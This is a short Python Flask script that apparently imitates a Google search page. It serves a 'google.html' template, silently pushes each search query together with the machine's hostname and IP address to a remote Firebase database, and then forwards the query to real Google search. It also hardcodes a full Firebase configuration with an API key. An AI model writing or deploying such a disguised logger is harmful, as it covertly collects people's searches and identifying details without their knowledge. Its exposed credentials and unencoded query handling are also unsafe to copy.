from flask import Flask, render_template,request
import webbrowser
import pyrebase
import socket


Config = {
    "apiKey": "AIzaSyCrrVAc_Eay1QWwG85U58oA0efmVKgP_MI",
    "authDomain": "history-f7673.firebaseapp.com",
    "databaseURL": "https://history-f7673.firebaseio.com",
    "projectId": "history-f7673",
    "storageBucket": "history-f7673.appspot.com",
    "messagingSenderId": "551822958643",
    "appId": "1:551822958643:web:60b62f46967697dfae0346",
    "measurementId": "G-K5QKMZJXSC"
  }

firbase = pyrebase.initialize_app(Config)

db = firbase.database()

hostname = socket.gethostname()  

IPAddr = socket.gethostbyname(hostname)
hostname=str(hostname)
app = Flask(__name__)

@app.route('/')

def index():
    return render_template("google.html")

@app.route('/Again')
def  get_name():
    url = "https://www.google.com/search?sxsrf=ACYBGNRB_iNOzYTX1hAxLbiiinOseLmEJQ%3A1579143062010&ei=ls8fXpknrpHj4Q-0mL7oBw&q="
    Search = request.args.get("input")
    name = request.args.get('input')
    db.child(hostname).push({"IP":IPAddr,"Searched":name})
    Search = str(Search)
    url+=Search+"&oq="+Search+"&gs_l=psy-ab.3..35i39l2j0l8.13082.14535..14916...2.0..0.163.944.0j6......0....1..gws-wiz.....10..35i362i39j0i273j0i131.aLybNLA_zms&ved=0ahUKEwiZyoqqjofnAhWuyDgGHTSMD30Q4dUDCAo&uact=5"
    webbrowser.open(url)
    return render_template('google.html')


if __name__=="__main__":
    app.run()

